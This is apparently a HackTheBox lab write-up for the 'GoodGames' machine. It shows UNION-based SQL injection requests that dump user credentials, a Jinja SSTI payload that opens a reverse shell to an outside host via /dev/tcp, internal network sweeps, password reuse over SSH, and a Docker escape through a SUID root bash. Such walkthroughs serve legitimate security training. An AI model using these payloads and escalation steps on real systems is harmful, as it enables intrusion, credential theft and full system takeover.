# GoodGames
## Linux
### HackTheBox
### Easy

IP: 10.129.96.71
Host: GoodGames.HTB

### NMAP
```Console
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48
  http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
  http-title: GoodGames | Community and Store
  http-server-header: Werkzeug/2.0.2 Python/3.9.2
  http-methods:
    Supported Methods: GET HEAD OPTIONS POST
2/udp     closed compressnet
49/udp    closed tacacs
135/udp   closed msrpc
515/udp   closed printer
983/udp   closed unknown
2048/udp  closed dls-monitor
5010/udp  closed telelpathstart
9370/udp  closed unknown
16786/udp closed unknown
17533/udp closed unknown
18331/udp closed unknown
19161/udp closed unknown
19625/udp closed unknown
19682/udp closed unknown
20164/udp closed unknown
20359/udp closed unknown
21644/udp closed unknown
22055/udp closed unknown
24606/udp closed unknown
26966/udp closed unknown
29810/udp closed unknown
29823/udp closed unknown
32768/udp closed omad
32780/udp closed sometimes-rpc24
36458/udp closed unknown
38063/udp closed unknown
40622/udp closed unknown
42056/udp closed unknown
42508/udp closed candp
43195/udp closed unknown
44160/udp closed unknown
45685/udp closed unknown
49189/udp closed unknown
51717/udp closed unknown
51972/udp closed unknown
53571/udp closed unknown
60423/udp closed unknown
```

### Directories
```Console
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://goodgames.htb
 🚀  Threads               │ 300
 📖  Wordlist              │ /SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💥  Timeout (secs)        │ 7
 💾  Output File           │ dirs/initialdirs.log
 💲  Extensions            │ [php, xml, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/8c399e1a5d2b45d59975ee239e1413cd (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 9265 responses; toggle this behavior by using --dont-filter
WLD      GET      267l      548w     9265c Got 200 for http://goodgames.htb/989e09c4de174c40979bf66baed0f702a7c078b5bc514bdca9a8debd8cd54bcc18b326e43d504b11b7a0d59aa56cbe58 (url length: 96)
200      GET      728l     2070w    33387c http://goodgames.htb/signup
200      GET      909l     2572w    44212c http://goodgames.htb/blog
200      GET     1735l     5548w    85107c http://goodgames.htb/
200      GET      267l      545w     9267c http://goodgames.htb/profile
200      GET      267l      553w     9294c http://goodgames.htb/login
302      GET        4l       24w      208c http://goodgames.htb/logout => http://goodgames.htb/
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
200      GET      287l      620w    10524c http://goodgames.htb/coming-soon
403      GET        9l       28w      278c http://goodgames.htb/server-status
[####################] - 28m  1764376/1764376 0s      found:11      errors:380915
[####################] - 28m   882190/882188  509/s   http://goodgames.htb
[####################] - 28m   882188/882188  510/s   http://goodgames.htb/
```

### goodgames.htb - login hijack
* Created an account and then captured the `POST` request to `/login` using BurpSuite
 * SQL Injection
```HTML
POST /login HTTP/1.1
Host: goodgames.htb
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://goodgames.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://goodgames.htb/signup
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -&password=password
```
  * Returns the following:
```HTML
<h1 class="text-main-1" style="font-size: 50px;">Login Successful</h1>

 <div class="nk-gap"></div>
 <h2 class="h4">Welcome information_schema:main:</h2>

 <div>Redirecting you to profile page...</div>
 <div class="nk-gap-3"></div>
```
 * Altered the SQL code to:
```HTML
POST /login HTTP/1.1
Host: goodgames.htb
Content-Length: 131
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://goodgames.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://goodgames.htb/signup
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'main'-- -&password=password
```
 * returns:
```HTML
<h1 class="text-main-1" style="font-size: 50px;">Login Successful</h1>

 <div class="nk-gap"></div>
 <h2 class="h4">Welcome blog:blog_comments:user:</h2>

 <div>Redirecting you to profile page...</div>
 <div class="nk-gap-3"></div>
```
 * Another alteration to the SQL requeset to pull from the `user` table:
 ```HTML
 POST /login HTTP/1.1
Host: goodgames.htb
Content-Length: 139
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://goodgames.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://goodgames.htb/signup
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=' union select 1,2,3,concat(table_name, ':') from information_schema.columns where table_name = 'user' = 'main'-- -&password=password
 ```
 * returns
 ```HTML
<h2 class="h4">Welcome ADMINISTRABLE_ROLE_AUTHORIZATIONS:APPLICABLE_ROLES:CHARACTER_SETS:CHECK_CONSTRAINTS:COLLATIONS:COLLATION_CHARACTER_SET_APPLICABILITY:COLUMNS:COLUMNS_EXTENSIONS:COLUMN_PRIVILEGES:COLUMN_STATISTICS:ENABLED_ROLES:ENGINES:EVENTS:FILES:INNODB_BUFFER_PAGE:INNODB_BUFFER_PAGE_LRU:INNODB_BUFFER_POOL_STATS:INNODB_CACHED_INDEXES:INNODB_CMP:INNODB_CMPMEM:INNODB_CMPMEM_RESET:INNODB_CMP_PER_INDEX:INNODB_CMP_PER_INDEX_RESET:INNODB_CMP_RESET:INNODB_COLUMNS:INNODB_DATAFILES:INNODB_FIELDS:INNODB_FOREIGN:INNODB_FOREIGN_COLS:INNODB_FT_BEING_DELETED:INNODB_FT_CONFIG:INNODB_FT_DEFAULT_STOPWORD:INNODB_FT_DELETED:INNODB_FT_INDEX_CACHE:INNODB_FT_INDEX_TABLE:INNODB_INDEXES:INNODB_METRICS:INNODB_SESSION_TEMP_TABLESPACES:INNODB_TABLES:INNODB_TABLESPACES:INNODB_TABLESPACES_BRIEF:INNODB_TABLESTATS:INNODB_TEMP_TABLE_INFO:INNODB_TRX:INNODB_VIRTUAL:KEYWORDS:KEY_COLUMN_USAGE:OPTIMIZER_TRACE:PARAMETERS:PARTITIONS:PLUGINS:PROCESSLIST:PROFILING:REFERENTIAL_CONSTRAINTS:RESOURCE_GROUPS:ROLE_COLUMN_GRANTS:ROLE_ROUTINE_GRANTS:ROLE_TABLE_GRANTS:ROUTINES:SCHEMATA:SCHEMATA_EXTENSIONS:SCHEMA_PRIVILEGES:STATISTICS:ST_GEOMETRY_COLUMNS:ST_SPATIAL_REFERENCE_SYSTEMS:ST_UNITS_OF_MEASURE:TABLES:TABLESPACES:TABLESPACES_EXTENSIONS:TABLES_EXTENSIONS:TABLE_CONSTRAINTS:TABLE_CONSTRAINTS_EXTENSIONS:TABLE_PRIVILEGES:TRIGGERS:USER_ATTRIBUTES:USER_PRIVILEGES:VIEWS:VIEW_ROUTINE_USAGE:VIEW_TABLE_USAGE:blog:blog_comments:</h2>
 ```
* Final alteration to the SQL injection:
```HTML
POST /login HTTP/1.1
Host: goodgames.htb
Content-Length: 107
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://goodgames.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://goodgames.htb/signup
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -&password=password
```
 * Results:
```HTML
<h2 class="h4">Welcome
	1:admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
	2:takeabreath:email@email.com:5f4dcc3b5aa765d61d8327deb882cf993:takeabreath:&#39; union select 1,2,3,4--&#39;:5f4dcc3b5aa765d61d8327deb882cf99</h2>
```

### Admin credentials
| Username | E-mail               | Password hash                            |
|----------|----------------------|------------------------------------------|
|admin     | admin@goodgames.htb  | 2b22337f218b2d82dfc3b6f77e7cb8ec         |
 * ran the hash through `name-that-hash`:
```Console
2b22337f218b2d82dfc3b6f77e7cb8ec

Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```
 * John doesn't return a result
 * Found the following result on [this md5 hash storage site](https://md5dz.wordpress.com/2014/01/16/md5dz-list62/)
   *  superadministrator:2b22337f218b2d82dfc3b6f77e7cb8ec
 * There's a gear icon on the top right corner of the page once logged in that routes to `internal-administration.goodgames.htb`
   * Added to `/etc/hosts`
   * Logged into admin panel at `http://internal-administration.goodgames.htb/index`, a Flask Volt page

### Dashboard login exploit
 * SSTI vulnerable; tested by entering `{{ 7 * 7}}` in the name and saving. Changes the name to `49`
 * Entered a shell payload in the same field: `{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.67/443 0>&1"').read() }}`
   * Also started `netcat` listner on port 443 to catch the request.
 * Acheived shell access as user `root`:
```Console
root@3a453ab39d3d:/backend# ls
Dockerfile
project
requirements.txt
root@3a453ab39d3d:/backend# whoami
root
root@3a453ab39d3d:/backend# cd /root
root@3a453ab39d3d:~# ls
root@3a453ab39d3d:~# ls -la
total 20
drwx------ 1 root root 4096 Nov  5 15:28 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  5 15:28 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwx------ 3 root root 4096 Nov  5 15:23 .cache
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
root@3a453ab39d3d:~# cd /home
root@3a453ab39d3d:/home# ls
augustus
root@3a453ab39d3d:/home# cd augustus
root@3a453ab39d3d:/home/augustus# ls
user.txt
root@3a453ab39d3d:/home/augustus# cat user.txt
6029b09ba997046bc10a5a3d10f0cf2b
root@3a453ab39d3d:/home/augustus#
```
 * Set a better shell:
```Console
root@3a453ab39d3d:/backend# script /dev/null -c bash
script /dev/null -c bash            
Script started, file is /dev/null
root@3a453ab39d3d:/backend# ^Z                 
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@3a453ab39d3d:/backend#
```

### Exploring shell
 * This is a docker container:
```Console
root@3a453ab39d3d:/backend# mount | grep "augustus"
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```
 * Checking for local IP connections:
```Console
root@3a453ab39d3d:/backend# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.052 ms
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.085 ms
```
 * Checking for open ports:
```Console
root@3a453ab39d3d:/backend# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open
```
 * SSH using `augustus` as the username and checked for password reuse
```Console
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator
```
 * Grabbed `user.txt`

### Accessed the goodgames.htb server
```Console
augustus@GoodGames:/$ cd root
-bash: cd: root: Permission denied
augustus@GoodGames:/$ sudo -l
-bash: sudo: command not found
augustus@GoodGames:/$ hostname -I
10.129.96.71 172.17.0.1 172.19.0.1 dead:beef::250:56ff:feb9:779e
```
 * Docker check:
```Console
augustus@GoodGames:/$ ps auxww | grep "docker"
root       745  0.0  2.1 1457424 86460 ?       Ssl  19:20   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1088  0.0  0.2 1148904 9580 ?        Sl   19:20   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
```
 * Copied `/bin/bash` to `augustus` while on the host.
 * Changed the permissions of `bash` while logged into the docker container:
```Console
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/backend# cd home
bash: cd: home: No such file or directory
root@3a453ab39d3d:/backend# cd /home
root@3a453ab39d3d:/home# ls
augustus
root@3a453ab39d3d:/home# cd augustus/
root@3a453ab39d3d:/home/augustus# ls
bash  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# ls -la
total 1168
drwxr-xr-x 2 1000 1000    4096 Apr 21 20:52 .
drwxr-xr-x 1 root root    4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root       9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwsrwxrwx 1 root root 1168776 Apr 21 20:52 bash
-rw-r----- 1 1000 1000      33 Apr 21 18:21 user.txt
```
 * Logged back into the host:
```Console
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password:
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 21 21:47:04 2022 from 172.19.0.2
augustus@GoodGames:~$ cd /home/augustus/
augustus@GoodGames:~$ ls
bash  user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.0# whoami
root
bash-5.0#
```
 * Grabbed the root flag:
```Console
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
```

Root flag obtained: 1ea***************************
